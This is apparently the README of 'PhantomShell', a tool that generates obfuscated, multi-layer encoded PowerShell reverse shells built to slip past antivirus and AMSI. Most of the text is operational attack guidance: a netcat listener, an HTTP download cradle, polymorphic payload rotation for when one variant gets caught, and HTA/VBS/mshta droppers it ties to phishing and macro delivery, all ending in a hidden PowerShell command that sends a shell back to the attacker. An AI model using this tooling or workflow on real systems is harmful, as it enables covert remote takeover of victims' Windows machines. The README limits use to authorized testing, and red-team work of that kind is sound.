<div align="center">

```
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
       ███████╗██╗  ██╗███████╗██╗     ██╗
       ██╔════╝██║  ██║██╔════╝██║     ██║
       ███████╗███████║█████╗  ██║     ██║
       ╚════██║██╔══██║██╔══╝  ██║     ██║
       ███████║██║  ██║███████╗███████╗███████╗
       ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

### Advanced PowerShell AV/AMSI Evasion Framework

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Version](https://img.shields.io/badge/Version-2.0-red?style=for-the-badge)](https://github.com/adrilaw/PhantomShell)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS-black?style=for-the-badge&logo=linux)](https://github.com/adrilaw/PhantomShell)
[![Target](https://img.shields.io/badge/Target-Windows-blue?style=for-the-badge&logo=windows)](https://github.com/adrilaw/PhantomShell)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

> **For authorized penetration testing and red team operations only.**

</div>

---

## 👻 What is PhantomShell?

PhantomShell generates obfuscated, base64-encoded PowerShell reverse shells designed to evade **signature-based** AV and AMSI detection. It automates the tedious process of renaming variables, encoding payloads across multiple layers, hiding connection details, and serving payloads over HTTP — all from a single command.

**v2.0 is a hardened rewrite.** Earlier versions had three bugs that caused shells to not work at all: illegal backticks on .NET methods, random case mutation breaking `Out-String`, and junk comment injection corrupting base64 strings. All three are gone. The tool now includes a built-in integrity verifier and round-trip decoder that confirms every payload is valid before printing it.

---

## 🔍 Is it "Fully Undetectable"?

**Honest answer: no tool can guarantee that — and any tool claiming otherwise is lying to you.**

Here is what PhantomShell actually does and what it doesn't:

| Layer | What it defeats | What it doesn't defeat |
|---|---|---|
| Variable renaming | Signature matching on known variable names | Behavioral/heuristic analysis |
| utf-16le base64 encoding | Plain-text pattern matching | Runtime AMSI scanning when the payload executes |
| Multi-layer IEX wrapping | Static analysis that only unpacks one layer | Deep sandboxing, EDR with full deobfuscation |
| IP/port b64 hiding | Simple string search for IPs | Network-level detection, DNS monitoring |
| Random variable names | Hash-based payload signatures | AI/ML-based behavioral detection |

**Against modern Windows Defender (real-time + cloud + AMSI):** the `random` profile with `--layers 3` and `--enc-b64` provides the best chance of bypassing signature-based detection. However, once the payload executes and opens a TCP socket, behavioral detection can still flag it. PhantomShell buys you an entry point — operational security beyond that is your responsibility.

**Best results in practice:**
- Use `--layers 3` on hardened targets
- Use `--enc-b64` to hide the IP/port
- Use `polymorph` to rotate payloads if one gets caught
- Pair with `server` so the payload is pulled over HTTP (reduces disk exposure)

---

## ✨ Features

| Feature | Status | Notes |
|---|---|---|
| 3 obfuscation profiles | ✅ Working | `minimal` `aggressive` `random` |
| Multi-layer encoding (1-3) | ✅ Working | Each layer wraps the previous |
| IP/port base64 hiding | ✅ Working | Connection details hidden inside payload |
| Polymorphic variants | ✅ Working | N unique payloads, all different fingerprints |
| 5 output formats | ✅ Working | `powershell` `cmd` `hta` `vbs` `mshta` |
| Built-in HTTP server | ✅ Working | Auto-names file, cleans up after use |
| Integrity verifier | ✅ Working | Validates payload before printing |
| Round-trip verifier | ✅ Working | Decodes layers and confirms correctness |
| Payload fingerprinting | ✅ Working | MD5 per payload for tracking |

---

## ⚙️ Installation

No dependencies. Pure Python stdlib.

```bash
git clone https://github.com/adrilaw/PhantomShell.git
cd PhantomShell
chmod +x phantomshell.py
python3 phantomshell.py --help
```

---

## 🚀 Quick Start

**Terminal 1 — start your listener:**
```bash
nc -lvnp 4444
```

**Terminal 2 — generate payload:**
```bash
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444
```

Copy the red output and run it on the target Windows machine. Shell arrives in Terminal 1.

---

## 📖 Command Reference

### `revshell` — Standalone Payload

Generates a single encoded command ready to paste and execute.

```bash
python3 phantomshell.py revshell -i <IP> -p <PORT> [OPTIONS]
```

| Flag | Short | Description | Default |
|---|---|---|---|
| `--attacker-ip` | `-i` | Your IP address | required |
| `--port` | `-p` | Listening port | required |
| `--obf-profile` | `-o` | `minimal` / `aggressive` / `random` | `aggressive` |
| `--layers` | `-l` | Encoding layers: `1` `2` `3` | `1` |
| `--format` | `-f` | `powershell` `cmd` `hta` `vbs` `mshta` | `powershell` |
| `--enc-b64` | | Hide IP and port in base64 | off |
| `--keep-pwd` | | Show CWD in prompt (may trigger AMSI) | off |
| `--do-not-hide` | | Omit `-NoP -sta -NonI -W Hidden` | off |
| `--verbose` | `-v` | Show decoded payload before encoding | off |
| `--no-banner` | | Suppress ASCII banner | off |

**Examples:**

```bash
# Basic — aggressive profile, layer 1
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444

# Maximum evasion — random vars, 3 layers, hidden IP/port
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -o random -l 3 --enc-b64

# HTA dropper with 2 layers
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f hta -l 2

# cmd.exe wrapper
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -f cmd

# See exactly what gets encoded (verbose)
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 -v

# No PS hidden-window flags (for testing)
python3 phantomshell.py revshell -i 10.10.10.5 -p 4444 --do-not-hide
```

---

### `server` — HTTP Payload Hosting

Writes the obfuscated `.ps1` to disk, starts a Python HTTP server, and prints a download cradle for the target to execute. The target pulls the script over HTTP and executes it — nothing touches disk on the target machine.

```bash
python3 phantomshell.py server -i <IP> -p <PORT> [OPTIONS]
```

| Flag | Description | Default |
|---|---|---|
| `-i` | Your IP (also used as HTTP server address) | required |
| `-p` | Reverse shell listening port | required |
| `--server-port` | HTTP server port | `8000` |
| `-o, --outfile` | Payload filename on disk | random e.g. `svc_abcxyz.ps1` |
| `--obf-profile` | `minimal` / `aggressive` / `random` | `aggressive` |
| `-l, --layers` | Encoding layers for the cradle | `1` |
| `-f, --format` | Output format | `powershell` |
| `--enc-b64` | Hide IP/port in base64 | off |
| `--keep-file` | Do not delete payload file after serving | off |
| `--keep-pwd` | Show CWD in prompt | off |
| `--do-not-hide` | Omit hidden-window flags | off |
| `-v` | Verbose output | off |

**Examples:**

```bash
# Default — serves on port 8000, random filename
python3 phantomshell.py server -i 10.10.10.5 -p 4444

# Custom HTTP port + named file
python3 phantomshell.py server -i 10.10.10.5 -p 4444 --server-port 9090 -o update.ps1

# 3 layers on the cradle + b64 IP hiding
python3 phantomshell.py server -i 10.10.10.5 -p 4444 -l 3 --enc-b64

# Keep the file after serving (for inspection)
python3 phantomshell.py server -i 10.10.10.5 -p 4444 --keep-file
```

**On the target — run the cradle printed by PhantomShell:**
```powershell
powershell -NoP -sta -NonI -W Hidden -enc <CRADLE_FROM_OUTPUT>
```

---

### `polymorph` — Polymorphic Variant Generator

Generates N unique payloads in one shot. Each variant rotates through profiles and uses fresh random variable names. Every variant has a different MD5 fingerprint — useful when one payload gets caught and you need to rotate quickly.

```bash
python3 phantomshell.py polymorph -i <IP> -p <PORT> [OPTIONS]
```

| Flag | Description | Default |
|---|---|---|
| `-i` | Your IP | required |
| `-p` | Listening port | required |
| `-n, --count` | Number of variants | `3` |
| `-l, --layers` | Encoding layers per variant | `1` |
| `--enc-b64` | Hide IP/port in base64 | off |
| `--keep-pwd` | Show CWD in prompt | off |
| `-v` | Verbose | off |

**Examples:**

```bash
# 5 variants, default settings
python3 phantomshell.py polymorph -i 10.10.10.5 -p 4444 -n 5

# 10 variants, 2 layers each, hidden IP
python3 phantomshell.py polymorph -i 10.10.10.5 -p 4444 -n 10 -l 2 --enc-b64

# 3 variants with 3 layers (maximum evasion)
python3 phantomshell.py polymorph -i 10.10.10.5 -p 4444 -n 3 -l 3
```

Output example:
```
── Variant 1  profile=minimal     layers=1  FP:B0CCA4CD  ──────────
── Variant 2  profile=aggressive  layers=1  FP:06F530B1  ──────────
── Variant 3  profile=random      layers=1  FP:A273D56F  ──────────
```

---

## 🎯 Obfuscation Profiles

### `minimal`
Simple short variable renames. Fast, readable, low footprint.
```
$client → $c    $stream → $st    $bytes → $b
$data → $d      $sendback → $sb  $sendback2 → $sb2  $sendbyte → $sy
```

### `aggressive` *(default)*
Medium-length obfuscated names with hex-style identifiers.
```
$client → $xA1   $stream → $xB2   $bytes → $xC3
$data → $xD4     $sendback → $xE5  $sendback2 → $xE52  $sendbyte → $xF6
```

### `random`
Fully random variable names on every execution. No two runs produce the same payload. Best against hash/signature-based detection.
```
$client → $mKpRx    $stream → $zQ6v8A6    $bytes → $hySOJ  (example)
```

---

## 🧅 Encoding Layers

| Layer | What it does |
|---|---|
| `1` | `utf-16le → base64` → standard PS `-enc` flag |
| `2` | Layer 1 blob wrapped in `IEX(FromBase64String(...))`, then encoded again |
| `3` | Layer 2 blob wrapped in `$_b=...; $_s=...; IEX($_s)`, then encoded again |

Each layer is a complete re-encoding of the previous stage. The payload is verified by decoding every layer before output — if any layer is corrupt, the tool refuses to print it.

---

## 📦 Output Formats

| Format | How to use it |
|---|---|
| `powershell` | Paste directly into PowerShell or a run dialog |
| `cmd` | Use when you have cmd.exe RCE (via `cmd /c`) |
| `hta` | Save as `.hta`, open with mshta.exe — phishing/click delivery |
| `vbs` | Save as `.vbs`, run with wscript/cscript — macro delivery |
| `mshta` | One-liner for `mshta vbscript:` execution |

---

## 🧪 Full Attack Workflow

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — host payload + print cradle
python3 phantomshell.py server -i 10.10.10.5 -p 4444 -o svc_update.ps1 -l 2 -o random

# [On target Windows machine — paste the red output from PhantomShell]
powershell -NoP -sta -NonI -W Hidden -enc <OUTPUT>

# Shell lands in Terminal 1
```

---

## ⚠️ Legal Disclaimer

PhantomShell is intended **exclusively** for:
- Authorized penetration testing engagements
- CTF (Capture The Flag) competitions
- Red team operations with explicit written permission
- Security research in isolated lab environments

**Using this tool against systems you do not own or have explicit written authorization to test is illegal.** The author assumes zero liability for misuse. You are solely responsible for your actions and compliance with applicable laws.

**Always get written authorization before testing.**

---

## 📜 License

```
MIT License

Copyright (c) 2025 adrilaw

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
```

---

## 🙏 Credits

- Original Nishang TCP reverse shell by [samratashok](https://github.com/samratashok/nishang)
- PhantomShell by [adrilaw](https://github.com/adrilaw)
- Inspired by [BypassAMSI_PSRevshell](https://github.com/gunzf0x/BypassAMSI_PSRevshell) by gunzf0x

---

<div align="center">

**Made with 🖤 by [Adrilaw/Kidpentester](https://github.com/Adrilaw)**

*Drop a ⭐ if it popped a shell*

</div>
